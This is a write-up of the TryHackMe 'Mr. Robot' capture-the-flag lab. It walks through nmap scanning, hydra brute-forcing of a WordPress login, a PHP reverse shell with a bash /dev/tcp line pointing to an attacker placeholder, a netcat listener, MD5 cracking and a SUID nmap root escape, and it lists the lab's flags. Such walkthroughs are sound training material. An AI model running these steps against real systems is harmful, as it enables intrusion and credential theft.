# THM: Mr. Robot CTF

## Challenge Details

- **Platform:** [[TryHackMe]]
- **Challenge Type:** [[Web Exploitation]], [[Linux Privilege Escalation]]
- **Difficulty:** Easy
- **Target IP/URL:** `10.10.184.214`
- **Status:** #solved
- **Date Solved:** [[2025-05-14]]

## 🎯 Objective

The primary objective of the Mr. Robot CTF was to discover three hidden flags (keys) by exploiting web vulnerabilities and escalating privileges on a Linux target machine.

## 🛠️ Tools Used

- [[Nmap]]
- `wget`
- `sort`
- `uniq`
- `wc`
- [[Gobuster]]
- [[CyberChef]]
- [[Revshells.com]]
- [[Netcat]]
- [[Python3]]
- [[John the Ripper]]
- `find`

---

## 🔍 Reconnaissance

The initial phase involved identifying active services and potential entry points on the target machine.

### Target Identification

For convenience during the CTF, the target IP was set as an environment variable:

Bash

```
export TARGET=10.10.184.214
```

### Port and Service Scanning with Nmap

A comprehensive `nmap` scan was performed to enumerate open ports and identify running services, along with service versions and default scripts.

Bash

```
nmap -sV -sC -Pn $TARGET
```

The scan results indicated that ports **80 (HTTP)** and **443 (HTTPS)** were open, suggesting a web-focused challenge.

### Web Application Analysis: `robots.txt`

The target hosted a Mr. Robot-themed website. A standard first step in web reconnaissance is to check the `robots.txt` file for disallowed entries or interesting paths that web crawlers might ignore.

Navigating to `http://$TARGET/robots.txt` revealed the following:

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

This discovery immediately provided the path to the first flag and a dictionary file.

---

## 🚩 Flag 1: Initial Discovery

Following the lead from `robots.txt`, the first key was directly accessible by navigating to its URL.

**Path:** `http://$TARGET/key-1-of-3.txt`

**Flag:**

```
073403c8a58a1f80d943455fb30724b9
```

---

## 📖 Further Enumeration & Credential Discovery

With the first flag secured, the focus shifted to leveraging the `fsocity.dic` file and performing deeper web enumeration to uncover additional vulnerabilities.

### Processing `fsocity.dic`

The `fsocity.dic` file, identified in `robots.txt`, was downloaded as a potential wordlist.

Bash

```
wget http://$TARGET/fsocity.dic
```

To optimize the wordlist for brute-forcing, its contents were de-duplicated and refined.

Bash

```
wc -w fsocity.dic
# 858160 fsocity.dic

sort fsocity.dic | uniq -d > fs-list   # Extract unique duplicates
sort fsocity.dic | uniq -u >> fs-list  # Append unique non-duplicates
wc -w fs-list
# 11451 fs-list
```

This process significantly reduced the wordlist size from 858,160 to 11,451 words, improving efficiency for subsequent brute-force attacks.

### Directory Brute-Forcing with Gobuster

`Gobuster` was used to perform directory brute-forcing on the web server, employing a common dictionary wordlist.

Bash

```
gobuster dir -u http://$TARGET -w /usr/share/dirbuster/wordlist/dictionary-list-2.3-small.txt -t 100 -q -o gobuster-small.txt
```

The `gobuster` scan yielded several interesting paths:

- `/sitemap`: Investigated but found no useful information.
- `/readme`: Displayed an unhelpful message: "I like where you head is at. However I'm not going to help you."
- `/license`: This proved to be a critical find.

### Base64 Encoded Credentials

Upon inspecting the source code of the `/license` page, a base64-encoded string was discovered.

**Encoded String:**

```
ZWxsaW90OkVSMjgtMDY1Mgo=
```

Using [[CyberChef]], the string was decoded from Base64:

Decoded Credentials:

elliot:ER28-0652

### **Method 2: Brute-Forcing WordPress Credentials with Hydra**

In addition to the previously discussed methods, an alternative approach was used to enumerate a valid username and then brute-force its corresponding password against the WordPress login page, located at `http://10.10.52.229/wp-login.php`. This method leveraged the `hydra` tool, exploiting distinct error messages for invalid usernames versus invalid passwords.

**2.1 Username Enumeration**

The first step involved brute-forcing common usernames against the `/wp-login.php` endpoint. A custom username list (`fs-list`, derived from `fsocity.dic`) was used, paired with a known, common password (`admin`). The key to this enumeration was identifying the unique error message displayed by WordPress for an invalid username.

The following `hydra` command was executed:

Bash

```
hydra -L fs-list -p admin 10.10.52.229 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F= Invalid username" -t 30
```

- `-L fs-list`: Specifies the username list.
- `-p admin`: Specifies the password to try for all usernames (a placeholder for enumeration).
- `10.10.52.229`: The target IP address.
- `http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F= Invalid username"`: Defines the HTTP POST form parameters and the failure string. `^USER^` and `^PASS^` are placeholders for `hydra` to inject values from the lists. `F= Invalid username` instructs `hydra` that lines containing "Invalid username" indicate a failed login due to a bad username.
- `-t 30`: Sets the number of concurrent tasks to 30.

The `hydra` output confirmed the existence of three valid usernames:

```
[...]
[80][http-post-form] host: 10.10.52.229     login: elliot     password: admin
[80][http-post-form] host: 10.10.52.229     login: Elliot     password: admin
[80][http-post-form] host: 10.10.52.229     login: ELLIOT     password: admin
[...]
1 of 1 target successfully completed, 3 valid passwords found
```

From these results, `elliot` (case-insensitive variants also found) was identified as a valid username for the next phase.

**2.2 Password Brute-Force**

With `elliot` confirmed as a valid username, the next step was to brute-force its password using the `fs-list` dictionary. The failure string was adjusted to reflect WordPress's response for a valid username but an incorrect password.

The `hydra` command used was:

Bash

```
hydra -l elliot -P fs-list 10.10.52.229 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username" -t 30
```

- `-l elliot`: Specifies the single username to test.
- `-P fs-list`: Specifies the password list.
- `F=The password you entered for the username`: Instructs `hydra` that this string indicates a failed login due to an incorrect password for a valid username.

`hydra` successfully identified the correct password:

```
[...]
[80][http-post-form] host: 10.10.52.229     login: elliot     password: ER28-0652
1 of 1 target successfully completed, 1 valid password found
```

This confirmed the credentials for elliot as elliot:ER28-0652, matching the findings from the initial reconnaissance.

## 🚀 Gaining Initial Access: WordPress Exploitation

The discovered credentials allowed access to the WordPress administration panel, opening a path to remote code execution.

### WordPress Login

The credentials `elliot:ER28-0652` were successfully used to log into the WordPress login interface at `http://$TARGET/wp-login.php`.

The `Elliot` user was found to have editor access to themes within the WordPress administration panel, which is a common vulnerability leading to arbitrary file upload and remote code execution.

### Generating and Uploading a PHP Reverse Shell

A PHP reverse shell payload was generated using [revshells.com](https://www.revshells.com/), configured to connect back to the attacking machine's IP address and a chosen port (53).

**Example PHP Reverse Shell Snippet:**

PHP

```
<?php
// Actual code would vary based on specific reverse shell chosen
// e.g., exec("/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/53 0>&1'");
?>
```

The generated PHP reverse shell code was then injected into one of the editable theme files (e.g., `twentyfifteen/archive.php`) via the WordPress theme editor.

### Catching the Reverse Shell with Netcat

On the Kali machine, a `netcat` listener was set up on port 53 to catch the incoming reverse shell connection.

Bash

```
rlwrap nc -nvlp 53
```

The reverse shell was triggered by navigating to the modified theme file in a web browser:

**Trigger URL:**

Bash

```
$TARGET/wp-content/themes/twentyfifteen/archive.php
```

**Netcat Listener Output (Connection Established):**

```
listening on [any] 53 ...
connect to [10.10.184.214] from [10.10.184.214] 49152
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
daemon@MrRobot:~$
```

The shell confirmed that we had gained access as the `daemon` user.

### Stabilizing the Shell

To improve interaction with the shell, a pseudo-terminal was spawned using Python.

Bash

```
python3 -c "import pty;pty.spawn('/bin/bash')"
```

---

## 🔑 Enumerating for the Second Flag

With a stable `daemon` shell, the next step was to enumerate the system for further flags and privilege escalation opportunities.

### User Directory Exploration

Exploring the `/home/` directory revealed a user named `robot`. Inside `/home/robot`, two interesting files were found:

- `key-2-of-3.txt`: The second flag, but permission denied as `daemon`.
- `password.raw.md5`: Contained an MD5 hash, likely for the `robot` user.

**MD5 Hash:**

```
c3fcd3d76192e4007dfb496cca67e13b
```

### Cracking the MD5 Hash with John the Ripper

[[John the Ripper]] was used to crack the MD5 hash with the `rockyou.txt` wordlist.

Bash

```
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt md5.hash
```

The hash was successfully cracked, revealing the password:

**Password:** `abcdefghijklmnopqrstuvwxyz`

### Switching User to `robot`

Using the cracked password, we switched the user to `robot`.

Bash

```
su robot
Password: abcdefghijklmnopqrstuvwxyz
robot@MrRobot:/home/daemon$
```

### Flag 2: Robot's Home Directory

With `robot` user privileges, the second flag was accessible.

Bash

```
cat /home/robot/key-2-of-3.txt
```

**Flag:**

```
822c73956184f694993bede3eb39f959
```

---

## 📈 Privilege Escalation to Root

To obtain the final flag, root access was required. A common Linux privilege escalation technique involves searching for SUID binaries.

### SUID Binary Enumeration

The `find` command was used to locate files with the SUID (Set User ID) bit set, which allows them to be executed with the permissions of their owner (e.g., root), regardless of the user executing them.

Bash

```
find / -perm -u=s -type f 2>/dev/null
# Alternative: find / -perm -4000 2>/dev/null
```

The output revealed that `/usr/local/bin/nmap` had the SUID bit set. `nmap` is known to have an interactive mode that can be leveraged to execute shell commands with elevated privileges when run as SUID.

### Exploiting SUID `nmap` for Root Shell

`nmap` was executed in interactive mode.

Bash

```
/usr/local/bin/nmap --interactive
```

Within the `nmap` interactive console, the `!sh` command was used to spawn a root shell.

```
nmap> !sh
# whoami
root
#
```

This successfully granted a root shell!

---

## 🏆 Flag 3: Root Access

With root privileges, the final flag was located in the root user's home directory.

**Path:** `/root/key-3-of-3.txt`

**Flag:**

Bash

```
cat /root/key-3-of-3.txt
04787ddef27c3dee1ee161b24670b4e4
```

---

## 📚 Lessons Learned

- **`robots.txt` Importance:** Always check `robots.txt` early in web reconnaissance; it often leaks sensitive file paths or hidden directories.
- **Web Enumeration Depth:** Thoroughly investigate all web pages, including their source code, for hidden information like base64 encoded strings or commented-out data.
- **WordPress Exploitation:** WordPress installations with editable theme files (due to weak permissions or compromised credentials) present a direct path to remote code execution via reverse shells.
- **Linux Privilege Escalation:**
    - **SUID Binaries:** Actively search for SUID binaries (`find / -perm -u=s`) as they are a common vector for privilege escalation.
    - **Known Vulnerabilities:** Be aware of known vulnerabilities in common SUID programs (like `nmap`'s interactive mode) that allow for shell escapes.
- **Hash Cracking:** Identify hash types and use appropriate tools (`John the Ripper`, `hashcat`) with relevant wordlists (`rockyou.txt`) for credential recovery.
- **Shell Stabilization:** Learn techniques to stabilize basic reverse shells (e.g., `python3 -c "import pty;pty.spawn('/bin/bash')"`) for better interaction.

## ✨ Additional Notes

The Mr. Robot CTF is an excellent introduction to CTF fundamentals, seamlessly blending web application vulnerabilities with Linux system exploitation. It reinforces the importance of meticulous enumeration at every stage of the penetration testing process.

---

**Category:** [[CyberSecurity]], [[Web Security]], [[Network Scanning]], [[Directory Brute-forcing]], [[WordPress Exploitation]], [[Credential Discovery]], [[Reverse Shell]], [[Privilege Escalation]], [[Linux]]
